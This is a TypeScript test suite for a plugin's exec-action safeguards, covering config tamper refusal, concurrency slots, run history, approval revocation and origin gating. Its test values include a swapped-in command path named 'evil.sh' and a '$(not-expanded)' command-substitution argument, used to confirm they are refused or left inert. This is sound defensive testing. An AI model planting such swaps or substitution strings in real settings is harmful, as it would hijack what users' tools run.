test('config.set: an exec definition added or altered in customActions by another plugin or the bridge is refused; by the person in /config it goes through', { options: OPTIONS }, async ($, on) => {
  on('config.set', (_$, e) => ({ value: e.value }))
  setUp(on)
  await start($)
  const set = (value: string, origin: { kind: 'composer' } | { kind: 'bridge' } | { kind: 'plugin'; name: string }, key = `${PLUGIN}.customActions`) =>
    $.config.set({ key, value, previous: SETTING, provider: { plugin: PLUGIN, tier: 'user' }, origin })
  const other = { kind: 'plugin', name: 'other' } as const
  const denied = { deny: t.customActionsConfigDenied }
  const added = JSON.stringify([...DEFS, { ...UPPER, id: 'evil', command: `${HOME}/bin/evil.sh` }])
  const swapped = JSON.stringify([{ ...UPPER, command: `${HOME}/bin/evil.sh` }, TALK, FREE])
  const relabelled = JSON.stringify([{ ...UPPER, label: 'Lowercase' }, TALK, FREE])
  for (const value of [added, swapped, relabelled]) {
    expect(await set(value, other)).toEqual(denied)
    expect(await set(value, { kind: 'bridge' }, `${PLUGIN}@market.customActions`)).toEqual(denied)
    expect(await set(value, { kind: 'composer' })).toEqual({ value })
  }
  // Taking exec definitions out, changing the other kinds, or the same exec definitions (reordered): let through.
  const ASK = { id: 'ask', icon: 'A', label: 'Ask', kind: 'complete', model: 'haiku', prompt: 'p' }
  for (const value of [JSON.stringify([UPPER]), '', JSON.stringify([...DEFS, ASK]), JSON.stringify([FREE, ASK, TALK, UPPER])]) {
    expect(await set(value, other)).toEqual({ value })
  }
})

test('config.set: exec definitions of the project settings copied into customActions by another plugin are refused; the user settings unreadable, any exec definition is', { options: OPTIONS }, async ($, on) => {
  on('config.set', (_$, e) => ({ value: e.value }))
  const { s } = setUp(on)
  await start($)
  const set = (value: string) => $.config.set({ key: `${PLUGIN}.customActions`, value, previous: SETTING, provider: { plugin: PLUGIN, tier: 'user' }, origin: { kind: 'plugin', name: 'other' } })
  const denied = { deny: t.customActionsConfigDenied }
  // The merged value (`previous`) holds them from the project; the user settings do not.
  s.sourceSettings.user = userSettings('[]')
  s.sourceSettings.project = { pluginConfigs: { [`${PLUGIN}@market`]: { options: { customActions: SETTING } } } }
  expect(await set(SETTING)).toEqual(denied)
  // No entry in the user settings at all: the same.
  s.sourceSettings.user = {}
  expect(await set(SETTING)).toEqual(denied)
  // Not readable: refused, while one with no exec definition goes through.
  s.sourceSettings.user = userSettings(SETTING)
  s.sourceDeny = ['user']
  expect(await set(SETTING)).toEqual(denied)
  const ASK = JSON.stringify([{ id: 'ask', icon: 'A', label: 'Ask', kind: 'complete', model: 'haiku', prompt: 'p' }])
  expect(await set(ASK)).toEqual({ value: ASK })
})

test('config.set: the customActions refusal in Japanese', { options: { ...OPTIONS, language: 'ja' } }, async ($, on) => {
  on('config.set', (_$, e) => ({ value: e.value }))
  setUp(on)
  await start($)
  const value = JSON.stringify([...DEFS, { ...UPPER, id: 'evil' }])
  expect(await $.config.set({ key: `${PLUGIN}.customActions`, value, previous: SETTING, provider: { plugin: PLUGIN, tier: 'user' }, origin: { kind: 'bridge' } })).toEqual({
    deny: MESSAGES.ja.customActionsConfigDenied,
  })
})

/**
 * Makes every exec run wait until released (oldest first): `release(n)` ends
 * the first n waiting with exit 0. `start(args)` runs the command without
 * waiting for it, and `drain()` releases every run still waiting and waits for
 * every command so started: a test that starts one ends with it, so none is
 * still pending when the engine is torn down (where it would be rejected with
 * "no implementation for command.run", a rejection nothing handles).
 */
function holdRuns($: Engine, s: Stage, clock: { settle: () => Promise<void> }) {
  const waiting: (() => void)[] = []
  const started: Promise<unknown>[] = []
  s.processAnswer = argv =>
    argv[0] === ENV_BIN ? new Promise(resolve => waiting.push(() => resolve({ exitCode: 0, stdout: 'done' }))) : defaultProcessAnswer(argv)
  const release = (n = 1) => {
    for (const done of waiting.splice(0, n)) done()
  }
  return {
    waiting,
    release,
    start: (args: string) => {
      started.push(runCommand($, args))
    },
    drain: async () => {
      release(waiting.length)
      await clock.settle()
      await Promise.all(started.splice(0))
    },
  }
}

test(`at most ${EXEC_CONCURRENT_MAX} exec actions at once: one more refused with why; one ended, the next runs`, { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  const held = holdRuns($, s, clock)
  for (let i = 0; i < EXEC_CONCURRENT_MAX; i++) held.start('free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX)
  const busy = t.customReason({ code: 'execBusy', max: EXEC_CONCURRENT_MAX })
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX)
  expect(s.toasts.some(x => x.includes(busy))).toBe(true)
  // A refused one is not in the history: it never started.
  expect(s.stored[HISTORY_KEY]).toBeUndefined()

  held.release(1)
  await clock.settle()
  held.start('free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX + 1)
  await held.drain()
})

test('a slot is given back however the run ends: exit 0, another code, a timeout, a start that failed', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  const answers = [{ exitCode: 0 }, { exitCode: 2 }, { deny: 'Command timed out' }, { deny: 'spawn EACCES' }, { exitCode: 0 }, { exitCode: 0 }]
  let n = 0
  s.processAnswer = argv => (argv[0] === ENV_BIN ? answers[n++]! : defaultProcessAnswer(argv))
  await start($)
  for (let i = 0; i < answers.length; i++) {
    await runCommand($, 'free')
    await clock.settle()
  }
  expect(execRuns(s)).toHaveLength(answers.length)
})

test('slots never given back (their runs dropped, as by a reload) are let go past the timeout and the grace, not before', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  // Not released while the test looks: only drained once it is done.
  const held = holdRuns($, s, clock)
  for (let i = 0; i < EXEC_CONCURRENT_MAX; i++) held.start('free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX)
  // Just before their time: still held, and a session.start again keeps them.
  await clock.advance(EXEC_TIMEOUT_DEFAULT_MS + EXEC_SLOT_GRACE_MS - 1000)
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX)
  // Past it: let go, and the next runs.
  await clock.advance(2000)
  held.start('free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX + 1)
  await held.drain()
})

test('the history: each run that started, how it ended, from where; never what it was given; refused ones not kept', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  const answers = [{ exitCode: 0, stdout: 'SECRET-OUT' }, { exitCode: 4 }, { deny: 'Command timed out' }, { deny: 'spawn EACCES' }]
  let n = 0
  s.processAnswer = argv => (argv[0] === ENV_BIN ? answers[n++]! : defaultProcessAnswer(argv))
  await start($)
  const at = clock.now()
  await runCommand($, 'free SECRET-IN')
  await clock.settle()
  await $.command.run(fromAfar('bridge', 'free'))
  await clock.settle()
  await $.command.run(fromPlugin('free'))
  await clock.settle()
  await runCommand($, 'free')
  await clock.settle()
  // Refused before it started (not approved, from afar): not kept.
  await $.command.run(fromAfar('sdk', 'upper'))
  await clock.settle()
  const history = s.stored[HISTORY_KEY] as { at: number; id: string; path: string; args: string; result: string; exitCode?: number; from: string }[]
  expect(history.map(e => [e.id, e.path, e.args, e.result, e.exitCode, e.from])).toEqual([
    ['free', TOOL, '[]', 'ok', undefined, 'composer'],
    ['free', TOOL, '[]', 'exit', 4, 'bridge'],
    ['free', TOOL, '[]', 'timeout', undefined, 'plugin'],
    ['free', TOOL, '[]', 'notStarted', undefined, 'composer'],
  ])
  for (const e of history) expect(e.at).toBeGreaterThanOrEqual(at)
  expect(JSON.stringify(history)).not.toContain('SECRET')
})

test(`the history keeps the newest ${EXEC_HISTORY_MAX}`, { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  s.stored[HISTORY_KEY] = Array.from({ length: EXEC_HISTORY_MAX }, (_, i) => ({ at: i + 1, id: 'old', path: TOOL, args: '[]', result: 'ok', from: 'composer' }))
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const history = s.stored[HISTORY_KEY] as { at: number; id: string }[]
  expect(history).toHaveLength(EXEC_HISTORY_MAX)
  expect(history[0]?.at).toBe(2)
  expect(history.at(-1)?.id).toBe('free')
})

test('/quick-actions exec-approvals: the approvals and the history listed', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[HISTORY_KEY] = [{ at: 0, id: 'gone', path: '/opt/x', args: '[]', result: 'exit', exitCode: 9, from: 'unknown' }]
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  const r = JSON.stringify(await runCommand($, 'exec-approvals'))
  for (const line of [
    t.execAdminOrigin(false),
    t.execAdminApprovals(1),
    `- ${t.execAdminApprovalLine('free', TOOL, '[]', hashOf(SCRIPT).slice(0, 12))}`,
    t.execAdminHistory(2, 2),
    `- ${t.execAdminHistoryLine(t.execAdminUnknownTime, 'gone', '/opt/x', t.execAdminOutcome('exit', 9), 'unknown')}`,
    t.execAdminUsage,
  ]) {
    expect(r).toContain(JSON.stringify(line).slice(1, -1))
  }
  expect(r).toContain(`free ${TOOL} ${t.execAdminOutcome('ok')} (from: composer)`)
  // Nothing run by listing.
  expect(execRuns(s)).toHaveLength(1)
})

test('/quick-actions exec-approvals revoke <id>: removed, and the next run asks again; one with no approval said so', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  s.stored[APPROVALS_KEY] = {
    upper: { path: TOOL, args: ['--fixed', '$(not-expanded)'], sha256: hashOf(SCRIPT) },
    free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) },
    removed: { path: '/opt/x', args: [], sha256: 'f'.repeat(64) },
  }
  await start($)
  expect(JSON.stringify(await runCommand($, 'exec-approvals revoke UPPER'))).toContain(t.execAdminRevoked('upper'))
  expect(Object.keys(s.stored[APPROVALS_KEY] as object).sort()).toEqual(['free', 'removed'])
  // An ID no longer defined can be revoked as well.
  expect(JSON.stringify(await runCommand($, 'exec-approvals revoke removed'))).toContain(t.execAdminRevoked('removed'))
  expect(JSON.stringify(await runCommand($, 'exec-approvals revoke upper'))).toContain(t.execAdminNotApproved('upper'))
  s.selected = 'abc'
  await runCommand($, 'upper')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
  expect(execRuns(s)).toHaveLength(1)
  // free still approved: no question.
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
})

test('/quick-actions exec-approvals revoke --all: every approval removed, counted; a bad argument changes nothing', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  const { s, w } = setUp(on)
  const kept = { upper: { path: TOOL, args: ['--fixed', '$(not-expanded)'], sha256: hashOf(SCRIPT) }, free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  s.stored[APPROVALS_KEY] = kept
  await start($)
  for (const bad of ['revoke', 'revoke a b', 'remove free', 'list']) {
    expect(JSON.stringify(await runCommand($, `exec-approvals ${bad}`))).toContain(JSON.stringify(t.execAdminBadArgs(bad)).slice(1, -1))
  }
  expect(s.stored[APPROVALS_KEY]).toEqual(kept)
  expect(JSON.stringify(await runCommand($, 'exec-approvals revoke --all'))).toContain(t.execAdminRevokedAll(2))
  expect(s.stored[APPROVALS_KEY]).toEqual({})
  await runCommand($, 'free')
  await clock.settle()
  expect(w.asked).toHaveLength(1)
})

test('/quick-actions exec-approvals with execOrigin terminal: the list for the prompt alone, revoking from anywhere', { options: OPTIONS }, async ($, on) => {
  const { s } = setUp(on)
  s.sourceSettings.user = userWithOrigin('terminal')
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  const reason = t.customReason({ code: 'execOrigin' })
  for (const kind of ['bridge', 'sdk'] as const) {
    const r = JSON.stringify(await $.command.run(fromAfar(kind, 'exec-approvals')))
    expect(r).toContain(JSON.stringify(reason).slice(1, -1))
    expect(r).not.toContain(TOOL)
  }
  const listed = JSON.stringify(await runCommand($, 'exec-approvals'))
  expect(listed).toContain(TOOL)
  expect(listed).toContain(JSON.stringify(t.execAdminOrigin(true)).slice(1, -1))
  expect(JSON.stringify(await $.command.run(fromAfar('bridge', 'exec-approvals revoke free')))).toContain(t.execAdminRevoked('free'))
  expect(s.stored[APPROVALS_KEY]).toEqual({})
})

test('exec-approvals is reserved: a custom definition with that ID is left out, the command still lists', { options: { ...EN, customActions: JSON.stringify([{ ...FREE, id: 'exec-approvals' }]) } }, async ($, on) => {
  const { s } = setUp(on, { setting: JSON.stringify([{ ...FREE, id: 'exec-approvals' }]) })
  await start($)
  const r = JSON.stringify(await runCommand($, 'exec-approvals'))
  expect(r).toContain(t.execAdminNoApprovals)
  expect(r).toContain(JSON.stringify(t.customReason({ code: 'idReserved' })).slice(1, -1))
  expect(execRuns(s)).toEqual([])
})

// ---------------------------------------------------------------------------
// The edges the first reviews found (SELM-00120 rework)

test('execOrigin: the user settings unreadable mid-session count as terminal; from afar refused saying why, at the prompt still run', { options: { ...OPTIONS, execOrigin: 'anywhere' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.sourceSettings.user = userWithOrigin('terminal')
  s.sourceSettings.project = { pluginConfigs: { [`${PLUGIN}@market`]: { options: { execOrigin: 'anywhere' } } } }
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  // The gate reads them once, at the first run; after that they cannot be read (being edited, broken).
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
  s.sourceDeny.push('user')
  const reason = t.customReason({ code: 'execOrigin', unreadable: true })
  for (const kind of ['bridge', 'sdk'] as const) {
    s.toasts = []
    await $.command.run(fromAfar(kind, 'free'))
    await clock.settle()
    expect(execRuns(s)).toHaveLength(1)
    expect(s.toasts.some(x => x.includes(reason))).toBe(true)
  }
  // The list is kept from afar the same way.
  const listed = JSON.stringify(await $.command.run(fromAfar('bridge', 'exec-approvals')))
  expect(listed).toContain(JSON.stringify(reason).slice(1, -1))
  expect(listed).not.toContain(TOOL)
  // The person's own hand needs no user settings to run.
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(2)
})

test('execOrigin terminal merged, the user settings unreadable: the plain execOrigin reason', { options: { ...OPTIONS, execOrigin: 'terminal' } }, async ($, on) => {
  const clock = mock.clock(on)
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  await runCommand($, 'free')
  await clock.settle()
  s.sourceDeny.push('user')
  await $.command.run(fromAfar('bridge', 'free'))
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
  expect(s.toasts.some(x => x.includes(t.customReason({ code: 'execOrigin' })))).toBe(true)
})

test('/quick-actions exec-approvals: $.store not readable is said so, never as no approvals or no runs', { options: OPTIONS }, async ($, on) => {
  let failReads = false
  const { s } = setUp(on)
  // $.store.get fails for these two keys while failReads holds (the stage's store.get throws reading them).
  for (const [key, value] of [
    [APPROVALS_KEY, { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }],
    [HISTORY_KEY, []],
  ] as const) {
    Object.defineProperty(s.stored, key, {
      enumerable: true,
      configurable: true,
      get: () => {
        if (failReads) throw new Error('store down')
        return value
      },
    })
  }
  await start($)
  failReads = true
  const r = JSON.stringify(await runCommand($, 'exec-approvals'))
  expect(r).toContain(JSON.stringify(t.execAdminApprovalsUnreadable).slice(1, -1))
  expect(r).toContain(JSON.stringify(t.execAdminHistoryUnreadable).slice(1, -1))
  expect(r).not.toContain(t.execAdminNoApprovals)
  expect(r).not.toContain(t.execAdminNoHistory)
  failReads = false
  expect(JSON.stringify(await runCommand($, 'exec-approvals'))).toContain(t.execAdminApprovals(1))
})

test('/quick-actions exec-approvals revoke: --all in any case; another flag a bad argument; none to revoke said so', { options: OPTIONS }, async ($, on) => {
  const { s } = setUp(on)
  const kept = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  s.stored[APPROVALS_KEY] = kept
  await start($)
  for (const bad of ['revoke --everything', 'revoke -a']) {
    expect(JSON.stringify(await runCommand($, `exec-approvals ${bad}`))).toContain(JSON.stringify(t.execAdminBadArgs(bad)).slice(1, -1))
  }
  expect(s.stored[APPROVALS_KEY]).toEqual(kept)
  expect(JSON.stringify(await runCommand($, 'exec-approvals revoke --ALL'))).toContain(t.execAdminRevokedAll(1))
  expect(s.stored[APPROVALS_KEY]).toEqual({})
  const none = JSON.stringify(await runCommand($, 'exec-approvals Revoke --All'))
  expect(none).toContain(t.execAdminNoneToRevoke)
  expect(none).not.toContain(t.execAdminRevokedAll(0))
})

test('the history keeps a run that started even when its entry cannot be settled', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  let failSettle = false
  on('state.set', (_$, e, next) => (failSettle && e.key === 'results' ? { deny: 'state down' } : next(e)))
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  s.processAnswer = argv => {
    if (argv[0] !== ENV_BIN) return defaultProcessAnswer(argv)
    failSettle = true
    return { exitCode: 3 }
  }
  await start($)
  await runCommand($, 'free').catch(() => undefined)
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
  const history = s.stored[HISTORY_KEY] as { id: string; result: string; exitCode?: number }[]
  expect(history.map(e => [e.id, e.result, e.exitCode])).toEqual([['free', 'exit', 3]])
  // Its slot was given back all the same.
  failSettle = false
  s.processAnswer = argv => (argv[0] === ENV_BIN ? { exitCode: 0 } : defaultProcessAnswer(argv))
  for (let i = 0; i < EXEC_CONCURRENT_MAX; i++) {
    await runCommand($, 'free')
    await clock.settle()
  }
  expect(execRuns(s)).toHaveLength(EXEC_CONCURRENT_MAX + 1)
})

test('the slots not writable: refused as such, not said to be busy, nothing run', { options: OPTIONS }, async ($, on) => {
  const clock = mock.clock(on)
  let failSlots = false
  on('state.set', (_$, e, next) => (failSlots && e.key === 'execSlots' ? { deny: 'state down' } : next(e)))
  const { s } = setUp(on)
  s.stored[APPROVALS_KEY] = { free: { path: TOOL, args: [], sha256: hashOf(SCRIPT) } }
  await start($)
  failSlots = true
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toEqual([])
  expect(s.toasts.some(x => x.includes(t.customReason({ code: 'execSlotFailed' })))).toBe(true)
  expect(s.toasts.some(x => x.includes(t.customReason({ code: 'execBusy', max: EXEC_CONCURRENT_MAX })))).toBe(false)
  failSlots = false
  await runCommand($, 'free')
  await clock.settle()
  expect(execRuns(s)).toHaveLength(1)
})
